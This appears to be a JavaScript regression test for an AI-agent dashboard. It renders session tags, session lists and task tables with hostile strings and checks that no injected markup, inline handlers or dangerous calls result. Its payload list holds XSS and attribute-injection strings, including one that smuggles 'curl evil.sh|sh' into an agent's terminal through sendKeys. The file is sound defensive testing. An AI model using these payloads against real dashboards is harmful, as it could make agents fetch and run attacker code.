// Runs the REAL renderers (jsdom + the real app-shell HTML) with attacker-controlled strings in
// every connector/agent/file-controlled field, and checks the markup they produce:
//   * no extra attribute or element appears, and no renderer writes an inline on* handler at
//     all (the dashboard CSP has no 'unsafe-inline' since #3645: one would not run);
//   * the exact payload from the #2785 review never reaches sendKeys;
//   * delegated actions (data-on-<event>="name", #3645) keep the same names as with benign data,
//     and firing each one through the real dispatcher never reaches a dangerous function: attacker
//     text can only ever be a data-* VALUE.
//   node renderer_payloads.test.mjs
import assert from 'node:assert';
import { installDom, importUi, STATIC } from './helpers/jsdom_env.mjs';

installDom({ mode: 'cloud' });
const { state } = await importUi('state');
const tags = await importUi('tags');
const render = await importUi('render');

const PAYLOADS = [
    "x'); sendKeys('agent-1','curl evil.sh|sh\\n'); foo('",          // the reviewer's exact payload
    "x\"); sendKeys(\"agent-1\",\"curl evil.sh|sh\\n\"); foo(\"",
    "a\" onmouseover=\"sendKeys('a','b')\" x=\"",                      // attribute injection
    "a' onmouseover='sendKeys(1,2)' x='",
    "\"><img src=x onerror=sendKeys(1,2)>",
    "'><svg onload=sendKeys(1,2)>",
    "</script><script>sendKeys(1,2)</script>",
    "\\'); sendKeys('1','2'); //",
    "\\u0027); sendKeys(1,2); (\\u0027",
    "&#39;); sendKeys(1,2); (&#39;",
    "&quot; onclick=&quot;sendKeys(1,2)",
    "x\n'); sendKeys('1','2'); ('\n",
    "${sendKeys('1','2')}", "`; sendKeys(1,2); `", "javascript:sendKeys(1,2)",
    " '); sendKeys(1,2); (' ",
];
const BENIGN = 'agent-one';

// Spy on every function a handler could reach, including dangerous ones the app really defines.
const called = [];
const DANGEROUS = ['sendKeys', 'sendRawKeys', 'executeMacro', 'sendQuickCommand', 'killSession', 'restartSession', 'foo', 'PWNED'];
for (const n of DANGEROUS) window[n] = globalThis[n] = (...a) => { called.push([n, ...a]); };

function snapshot(root = document.body) {
    const attrs = new Set(), tagsSeen = new Set(), handlers = [], actions = [];
    for (const el of root.querySelectorAll('*')) {
        tagsSeen.add(el.tagName);
        for (const a of el.attributes) {
            attrs.add(a.name);
            if (/^on/.test(a.name)) handlers.push({ el, name: a.name, src: a.value });
            if (/^data-on-/.test(a.name)) actions.push({ el, name: a.name, action: a.value });
        }
    }
    return { attrs, tagsSeen, handlers, actions };
}

function check(label, base, now) {
    for (const t of now.tagsSeen) assert.ok(base.tagsSeen.has(t), `${label}: new element <${t}> appeared`);
    for (const a of now.attrs) assert.ok(base.attrs.has(a), `${label}: injected attribute "${a}"`);
    assert.deepStrictEqual(now.handlers.map(h => `${h.name}="${h.src.slice(0, 80)}"`), [], `${label}: an inline handler`);
    // A delegated action's name is a constant: the payload can't add or change one.
    const okActions = new Set(base.actions.map(a => a.name + '|' + a.action));
    for (const a of now.actions) assert.ok(okActions.has(a.name + '|' + a.action), `${label}: action changed or injected: ${a.name}="${a.action}"`);
}

function scenario(label, setup, run, clear) {
    clear();
    const empty = snapshot();
    // The page's own markup (its templates' buttons) is there before the renderer runs: only what
    // the renderer produced is fired (firing the page's Send or Restart would change the page).
    const pageEls = new Set(empty.actions.map(a => a.el));
    setup(BENIGN); run();
    const base = snapshot(); clear();
    assert.ok(base.actions.length > empty.actions.length, `${label}: the renderer produced no actions with benign data, so the test would prove nothing`);
    assert.deepStrictEqual(base.handlers.map(h => `${h.name}="${h.src.slice(0, 80)}"`), [], `${label}: the renderer writes an inline handler`);
    for (const p of PAYLOADS) {
        called.length = 0;
        setup(p); run();
        const now = snapshot();
        check(`${label} [${JSON.stringify(p).slice(0, 40)}]`, base, now);
        // Fire every delegated action through the real dispatcher (actions.js) as its event would.
        for (const a of now.actions) {
            if (pageEls.has(a.el)) continue;
            called.length = 0;
            a.el.dispatchEvent(new window.Event(a.name.slice('data-on-'.length), { bubbles: true, cancelable: true }));
            assert.deepStrictEqual(called, [], `${label}: action ${a.action} reached a dangerous function (payload ${JSON.stringify(p)}): ${JSON.stringify(called)}`);
        }
        clear();
    }
    return base.actions.length;
}

let total = 0;

// ── tags (tags.js:47 in the review) ──────────────────────────────────
total += scenario('session tags',
    p => { state.currentSession = { name: p, type: 'live', session_id: p }; },
    () => renderSessionTagsInto(),
    () => { document.getElementById('history-session-tags').innerHTML = ''; });
function renderSessionTagsInto() {
    const p = state.currentSession.name;
    tags.renderSessionTags([{ id: 7, name: p, color: p }, { id: 8, name: BENIGN, color: '#fff' }]);
}

// The exact exploit chain from the review, spelled out: the tag chip made for the hostile agent
// name must call removeTagFromSession once, with the whole name as ONE argument. Since #3645 the
// chip names an action (data-on-click) and carries the name as data; it is clicked through the
// real dispatcher.
{
    const name = PAYLOADS[0];
    state.currentSession = { name, type: 'live' };
    tags.renderSessionTags([{ id: 7, name: 'x', color: '#fff' }]);
    const el = document.querySelector('.tag-remove');
    const seen = [];
    window.removeTagFromSession = globalThis.removeTagFromSession = (...a) => seen.push(a);
    called.length = 0;
    assert.equal(el.getAttribute('onclick'), null, 'no inline handler on the chip');
    el.dispatchEvent(new window.Event('click', { bubbles: true }));
    assert.deepStrictEqual(seen, [[name, 7]], 'the agent name must arrive intact as a single argument');
    assert.deepStrictEqual(called, [], 'sendKeys must not run');
    document.getElementById('history-session-tags').innerHTML = '';
}

// ── live session list (render.js) ────────────────────────────────────
function session(p, i = 0) {
    return {
        name: p, session_id: p, agent_type: 'claude', display_name: p, working_directory: p, folder_name: p,
        summary: p, branch: p, board_project: p, workflow_name: p, server: 'srv', status: 'working', state: 'working',
        waiting_for_input: false, sleeping: false, context_pct: 12, tags: [{ id: 1, name: p, color: p }], icon: p, role: p,
        commit: { hash: p, message: p }, task: p, board_name: p, team: p, git_branch: p, path: p, id: i,
    };
}
total += scenario('live sessions',
    p => { state.liveSessions = [session(p), session(BENIGN, 1)]; state.servers = []; },
    () => { try { render.renderLiveSessions(state.liveSessions); } catch (e) { if (!/not defined|Cannot read|null/.test(String(e))) throw e; } },
    () => { const l = document.getElementById('session-list'); if (l) l.innerHTML = ''; });

// ── history list ─────────────────────────────────────────────────────
total += scenario('history sessions',
    p => { state.currentSession = null; state.historySessionsList = [{ ...session(p), session_id: 'h-' + p, title: p, updated_at: '2026-01-01T00:00:00Z', type: 'session', message_count: 3, first_message: p, summary: p, tags: [{ id: 1, name: p, color: p }] }]; },
    () => { try { render.renderHistorySessions(state.historySessionsList, 1, 1, 50); } catch (e) { if (!/not defined|Cannot read|null/.test(String(e))) throw e; } },
    () => { const l = document.getElementById('history-sessions-list'); if (l) l.innerHTML = ''; });

// ── agent tasks in the board task table ──────────────────────────────
const tasksMod = await importUi('tasks');
total += scenario('agent tasks',
    p => { state.currentSession = { name: BENIGN, type: 'live', session_id: 's1' }; state.currentAgentTasks = [{ id: 11, title: p, description: p, status: 'pending', priority: 'high', session_id: p, tags: [p], created_at: '2026-01-01T00:00:00Z', depends_on: [{ task_id: 12, title: p }] }]; },
    () => { try { tasksMod.renderBoardTaskList(); } catch (e) { if (!/not defined|Cannot read|null/.test(String(e))) throw e; } },
    () => { for (const id of ['board-task-list', 'task-bar-list', 'board-tasks-body']) { const l = document.getElementById(id); if (l) l.innerHTML = ''; } });

console.log(`renderer_payloads.test.mjs: ok (${PAYLOADS.length} payloads, ${total} baseline actions across scenarios)`);
process.exit(0);
